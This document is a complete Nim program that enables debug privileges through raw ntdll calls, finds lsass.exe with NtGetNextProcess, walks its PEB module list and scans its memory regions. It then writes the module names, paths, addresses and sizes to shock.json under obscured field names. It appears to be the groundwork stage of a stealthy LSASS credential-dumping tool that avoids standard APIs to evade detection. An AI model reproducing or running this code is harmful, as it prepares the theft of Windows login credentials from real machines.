import winim/lean
import json
import strutils


# Constants
const
  TOKEN_ADJUST_PRIVILEGES = 0x00000020
  TOKEN_QUERY = 0x00000008
  MEM_COMMIT = 0x00001000
  PAGE_NOACCESS = 0x01


# Structures
type
  TOKEN_PRIVILEGES* = object
    PrivilegeCount*: DWORD
    Luid*: LUID
    Attributes*: DWORD

  LUID* = object
    LowPart*: DWORD
    HighPart*: LONG

  MEMORY_BASIC_INFORMATION = object
    BaseAddress: pointer
    AllocationBase: pointer
    AllocationProtect: int32
    RegionSize: pointer
    State: int32
    Protect: int32
    Type: int32

  ModuleInformation = object
    Name: string
    FullPath: string
    Address: PVOID
    Size: int


# Function Declarations
proc NtOpenProcessToken(ProcessHandle: HANDLE, DesiredAccess: DWORD, TokenHandle: PHANDLE): NTSTATUS {.discardable, dynlib: "ntdll", importc: "NtOpenProcessToken".}
proc NtAdjustPrivilegesToken(TokenHandle: HANDLE, DisableAllPrivileges: BOOL, NewState: PTOKEN_PRIVILEGES, BufferLength: DWORD, PreviousState: PTOKEN_PRIVILEGES, ReturnLength: PDWORD): NTSTATUS {.discardable, dynlib: "ntdll", importc: "NtAdjustPrivilegesToken".}
proc NtClose(hObject: HANDLE): NTSTATUS {.discardable, dynlib: "ntdll", importc: "NtClose".}
proc NtGetNextProcess(handle: HANDLE, DesiredAccess: DWORD, HandleAttributes: DWORD, Flags: DWORD, outHandle: PHANDLE): BOOL {.discardable, dynlib: "ntdll", importc: "NtGetNextProcess".}
proc NtQueryInformationProcess(processHandle: HANDLE, processInformationClass: DWORD, pbi: PVOID, processInformationLength: DWORD, returnLength: PDWORD): NTSTATUS {.discardable, dynlib: "ntdll", importc: "NtQueryInformationProcess".}
proc NtQueryVirtualMemory(hProcess: HANDLE, lpAddress: PVOID, MemoryInformationClass: DWORD, MemoryInformation: PMEMORY_BASIC_INFORMATION, MemoryInformationLength: DWORD, ReturnLength: PDWORD): ULONG {.discardable, dynlib: "ntdll", importc: "NtQueryVirtualMemory".}
proc NtReadVirtualMemory(hProcess: HANDLE, lpBaseAddress: PVOID, lpBuffer: pointer, dwSize: DWORD, lpNumberOfBytesRead: PDWORD): NTSTATUS {.discardable, dynlib: "ntdll", importc: "NtReadVirtualMemory".}


proc enableDebugPrivileges() =
  var
    currentProcess = GetCurrentProcess()
    tokenHandle: HANDLE = 0

  let ntstatus = NtOpenProcessToken(currentProcess, TOKEN_QUERY or TOKEN_ADJUST_PRIVILEGES, addr tokenHandle)
  if ntstatus != 0:
    echo "[-] Error calling NtOpenProcessToken. NTSTATUS: 0x", toHex(ntstatus)
    quit(-1)

  var tokenPrivileges = TOKEN_PRIVILEGES(
    PrivilegeCount: 1,
    Luid: LUID(LowPart: 20, HighPart: 0),
    Attributes: 0x00000002
  )

  let adjustStatus = NtAdjustPrivilegesToken(tokenHandle, false, cast[PTOKEN_PRIVILEGES](addr(tokenPrivileges)), DWORD(sizeof(tokenPrivileges)), nil, nil)
  if adjustStatus == 0x00000106:
    echo "[-] NTSTATUS: 0x0x00000106. Are you running as administrator?"
    quit(-1)
  if adjustStatus != 0:
    echo "[-] Error calling NtAdjustPrivilegesToken. NTSTATUS: 0x", toHex(adjustStatus)
    quit(-1)

  if tokenHandle != 0:
    discard NtClose(tokenHandle)


proc readRemoteIntPtr(hProcess: HANDLE, memAddress: PVOID): PVOID =
  var buffer: array[8, byte]
  let ntstatus = NtReadVirtualMemory(hProcess, memAddress, addr buffer[0], DWORD(buffer.len), nil)
  if ntstatus != 0 and ntstatus != 0xC0000005 and ntstatus != 0x8000000D and hProcess != 0:
    echo "[-] Error calling NtReadVirtualMemory (readRemoteIntPtr). NTSTATUS: 0x", toHex(ntstatus), " reading address 0x", toHex(cast[int](memAddress))
  result = cast[PVOID](cast[int64](buffer))


proc readRemoteWStr(hProcess: HANDLE, memAddress: PVOID): string =
  var buffer: array[256, byte]
  let ntstatus = NtReadVirtualMemory(hProcess, memAddress, addr buffer[0], DWORD(buffer.len), nil)
  if ntstatus != 0 and ntstatus != 0xC0000005 and ntstatus != 0x8000000D and hProcess != 0:
    echo "[-] Error calling NtReadVirtualMemory (readRemoteWStr). NTSTATUS: 0x", toHex(ntstatus), " reading address 0x", toHex(cast[int](memAddress))
  # echo "result: \t", ntstatus
  result = ""

  var unicodeString = ""
  for i in countup(0, buffer.len - 2, 2):  # Evitar desbordamiento de índice
    let lowByte = buffer[i]
    let highByte = buffer[i + 1]
    if lowByte == 0 and highByte == 0:
      break
    let codePoint = (highByte shl 8) or lowByte
    unicodeString.add(chr(codePoint))  
  return unicodeString


proc waitForKey() =
  echo "Press Enter to continue..."
  discard stdin.readLine()


proc toHexTrimmed(n: int): string =
  result = toHex(n)
  result = result.strip(chars = {'0'}, leading = true, trailing = false)  # Eliminar ceros a la izquierda
  if result.len == 0: result = "0"  # Si queda vacío, devolver "0"


proc customGetModuleHandle(hProcess: HANDLE): seq[ModuleInformation] =
  var moduleInformationList: seq[ModuleInformation] = @[]

  const
    processBasicInformationSize = 48
    ldrOffset = 0x18
    inInitializationOrderModuleListOffset = 0x30
    flinkDllBaseOffset = 0x20
    flinkBufferFullDllNameOffset = 0x40
    flinkBufferOffset = 0x50

  var pbi_byte_array: seq[byte] = newSeq[byte](process_basic_information_size)
  var pbi_byte_array_addr = addr pbi_byte_array[0]

  var returnLength: ULONG
  let ntstatus = NtQueryInformationProcess(
    hProcess,
    0'i32,
    pbi_byte_array_addr,
    process_basic_information_size.ULONG,
    addr returnLength
  )

  if ntstatus != 0:
    echo "[-] Error calling NtQueryInformationProcess. NTSTATUS: 0x", ntstatus.toHex

  let subSlice = pbi_byte_array[8..15]
  var pebAddress: uint64 = 0
  for i in 0..<subSlice.len:
    pebAddress = pebAddress or (uint64(subSlice[i]) shl (i * 8))

  let ldrPointer = cast[PVOID](cast[int](pebAddress) + ldrOffset)
  let ldrAddress = readRemoteIntPtr(hProcess, ldrPointer)

  let inInitializationOrderModuleList = cast[PVOID](cast[int](ldrAddress) + inInitializationOrderModuleListOffset)
  var nextFlink = readRemoteIntPtr(hProcess, inInitializationOrderModuleList)
  
  # echo "pebAddress: \t", cast[int](pebAddress).toHex
  # echo "ldrPointer: \t", cast[int](ldrPointer).toHex
  # echo "ldrAddress: \t", cast[int](ldrAddress).toHex
  # echo "inInitializationOrderModuleList: \t\t", cast[int](inInitializationOrderModuleList).toHex
  # echo "nextFlink (1): \t", cast[int](nextFlink).toHex

  var dllBase: PVOID = cast[PVOID](1337)

  while dllBase != nil:
    nextFlink = cast[PVOID](cast[int](nextFlink) - 0x10)
    # echo "nextFlink: \t\t", cast[int](nextFlink).toHex

    dllBase = readRemoteIntPtr(hProcess, cast[PVOID](cast[int](nextFlink) + flinkDllBaseOffset))
    let buffer = readRemoteIntPtr(hProcess, cast[PVOID](cast[int](nextFlink) + flinkBufferOffset))
    var baseDllName = ""
    if buffer != nil:
      baseDllName = readRemoteWStr(hProcess, buffer)
    let fullDllPath = readRemoteWStr(hProcess, readRemoteIntPtr(hProcess, cast[PVOID](cast[int](nextFlink) + flinkBufferFullDllNameOffset)))

    # echo "baseDllName: \t", baseDllName
    # echo "fullDllPath: \t", fullDllPath

    if baseDllName != "":
      moduleInformationList.add(ModuleInformation(
        Name: baseDllName.toLower(),
        FullPath: fullDllPath,
        Address: dllBase,
        Size: 0
      ))
    nextFlink = readRemoteIntPtr(hProcess, cast[PVOID](cast[int](nextFlink) + 0x10))

  result = moduleInformationList


proc writeToFile(path: string, content: string) =
  writeFile(path, content)
  echo "[+] File ", path, " generated."


proc getProcNameFromHandle(processHandle: HANDLE): string =
  const
    processBasicInformationSize = 48
    commandlineOffset = 0x68

  var pbi_byte_array: seq[byte] = newSeq[byte](process_basic_information_size)
  var pbi_byte_array_addr = addr pbi_byte_array[0]

  var returnLength: ULONG
  let ntstatus = NtQueryInformationProcess(
    process_handle,
    0'i32,
    pbi_byte_array_addr,
    process_basic_information_size.ULONG,
    addr returnLength
  )

  if ntstatus != 0:
    echo "[-] Error calling NtQueryInformationProcess. NTSTATUS: 0x", ntstatus.toHex

  let subSlice = pbi_byte_array[8..15]
  var pebAddress: uint64 = 0
  for i in 0..<subSlice.len:
    pebAddress = pebAddress or (uint64(subSlice[i]) shl (i * 8))

  const processParametersOffset = 0x20
  let processParametersPointer = cast[PVOID](cast[int](pebAddress) + processParametersOffset)
  let processParametersAddress = readRemoteIntPtr(processHandle, processParametersPointer)
  let commandlinePointer = cast[PVOID](cast[int](processParametersAddress) + commandlineOffset)
  let commandlineAddress = readRemoteIntPtr(processHandle, commandlinePointer)

  var proc_name = readRemoteWStr(processHandle, commandlineAddress)
  return proc_name


proc getProcessByName(procName: string): HANDLE =
  var auxHandle: HANDLE = 0
  const MAXIMUM_ALLOWED = 0x02000000
  while NtGetNextProcess(auxHandle, MAXIMUM_ALLOWED, 0, 0, addr auxHandle) == 0:
    let currentProcName = getProcNameFromHandle(auxHandle)
    # echo "currentProcName: ", currentProcName
    if currentProcName.toLower() == procName.toLower():
      return auxHandle
  result = 0


proc shock(fileName: string) =
  enableDebugPrivileges()

  let procName = "C:\\Windows\\System32\\lsass.exe"
  let processHandle = getProcessByName(procName)
  if processHandle == 0:
    echo "[-] It was not possible to get a process handle."
    quit(-1)

  var moduleInformationList = customGetModuleHandle(processHandle)
  
  const procMaxAddress = 0x7FFFFFFEFFFF
  var auxSize = 0
  var auxName = ""
  var memAddress: int = 0
  var auxModule = ModuleInformation(Name: "test", FullPath: "", Address: nil, Size: 0.int)

  while cast[int](memAddress) < procMaxAddress:
    var mbi: MEMORY_BASIC_INFORMATION
    var returnLength: uint32

    var ntstatus = NtQueryVirtualMemory(
      processHandle,
      cast[PVOID](memAddress),
      0.DWORD,
      cast[PMEMORY_BASIC_INFORMATION](addr(mbi)),
      0x30.DWORD,
      cast[PDWORD](addr(returnLength))
    )

    if ntstatus != 0:
      echo "[-] Error calling NtQueryVirtualMemory. NTSTATUS: 0x", toHex(cast[uint64](ntstatus))
      quit(-1)
  
    if cast[int](mbi.Protect) != PAGE_NOACCESS and cast[int](mbi.State) == MEM_COMMIT:
      for m in moduleInformationList:
        if m.Name == auxName:
          auxModule = m
          break

      var region_size = cast[int](mbi.RegionSize)

      if region_size == 0x1000 and cast[int](mbi.BaseAddress) != cast[int](auxModule.Address):        
        # echo "r: ",region_size
        auxModule.Size = cast[int](auxSize)

        # Replace
        for i in 0 ..< moduleInformationList.len:
          if moduleInformationList[i].Name == auxName:
            # echo "Replacing ", moduleInformationList[i].Name, " with ", auxModule.Name
            moduleInformationList[i] = auxModule

        for m in moduleInformationList:
          if cast[int](mbi.BaseAddress) == cast[int](m.Address):
            auxName = m.Name
            # echo "auxName:\t",auxName
            auxSize = cast[int](mbi.RegionSize)

      else:
        echo "AuxSize:\t",auxSize
        auxSize += cast[int](mbi.RegionSize)
        # echo "AuxSize 2:\t",auxSize

    memAddress += cast[int](mbi.RegionSize)
    # var b = toHex(cast[int](memAddress)) # ???

  var shockString = "["
  for module in moduleInformationList:    
    # echo "Name: ", module.Name
    # echo "Size: ", module.Size
    # echo "FullPath: ", module.FullPath
    # echo "Address: 0x", (module.Address).toHex()
    # echo "a"
    # echo "b"

    let moduleData = %*{
      "field0": module.Name,
      "field1": module.FullPath,
      "field2": "0x" & toHexTrimmed(cast[int](module.Address)),
      "field3": $module.Size
    } 

    #echo moduleData
    if shockString.len > 1:
      shockString.add(", ")  # Agrega una coma entre objetos JSON
    shockString.add($moduleData)

  shockString.add("]")  # Cierra el JSON array
  writeToFile(fileName, shockString)
  discard NtClose(processHandle)

when isMainModule:
  if not defined(cpu64):
    echo "[-] File must be compiled as 64-bit binary."
    quit(-1)

  shock("shock.json")